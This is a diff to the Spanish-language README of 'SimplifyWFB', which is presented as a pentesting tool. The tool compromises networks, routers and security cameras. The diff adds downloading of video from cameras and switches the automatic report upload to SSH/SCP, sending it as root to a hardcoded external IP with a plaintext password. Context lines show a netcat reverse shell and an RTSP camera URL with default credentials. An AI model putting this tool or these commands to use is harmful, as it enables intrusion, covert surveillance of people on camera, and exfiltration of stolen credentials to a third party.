@@ -166,7 +166,8 @@ SimplifyWFB es una herramienta profesional de pentesting que **analiza redes de 
       "screenshots": [
         "camera_192.168.1.50_screenshot_1.jpg",
         "camera_192.168.1.50_screenshot_2.jpg"
-      ]
+      ],
+      "video_file": "camera_192.168.1.50_video_1640995200.mp4"
     }
   ]
 }
@@ -198,6 +199,12 @@ Si configuraste port forwarding:
 ### **MÉTODO 4: Software Especializado** 💻
 - **VLC Media Player**: Abre red → `rtsp://admin:12345@192.168.1.50:554/stream1`
 - **Software de cámaras**: Usa las credenciales del reporte
+
+### **MÉTODO 5: Video Descargado** 📹
+- **Archivo de video**: `camera_192.168.1.50_video_1640995200.mp4`
+- **Duración**: 5 segundos o 100MB (lo que se cumpla primero)
+- **Formato**: MP4
+- **Ubicación**: Directorio `camera_videos_TIMESTAMP/`
 
 ---
 
@@ -270,8 +277,9 @@ Edita el archivo `config.json`:
     "external_ip": "TU_IP_PUBLICA",
     "external_port": 4444
   },
-  "ftp_upload": {
+  "ssh_upload": {
     "host": "184.107.168.100",
+    "port": 22,
     "username": "root",
     "password": "2vcA,%K6@8pJgq_b"
   }
@@ -299,7 +307,7 @@ En el modo frío, después de completar todas las fases:
 El script genera un archivo `simplifywfb_report_TIMESTAMP.json` con todos los datos.
 
 ### **PASO 5: Envío Automático** 📤
-- **Reporte enviado por FTP** automáticamente a `184.107.168.100`
+- **Reporte enviado por SSH/SCP** automáticamente a `184.107.168.100:22`
 - **Archivo local** se mantiene en el equipo
 - **Acceso remoto** a los datos desde cualquier lugar
 
@@ -336,7 +344,7 @@ nc -e /bin/bash TU_IP_PUBLICA 4444
 - **Lista de computadoras** en la red
 - **Credenciales válidas** para acceder a sistemas
 - **Acceso completo** al router de la red
-- **Control de cámaras** de seguridad
+- **Control de cámaras** de seguridad con video descargado
 - **Servicios vulnerables** (MongoDB, Redis, Docker, etc.)
 - **Múltiples formas** de acceder remotamente
 
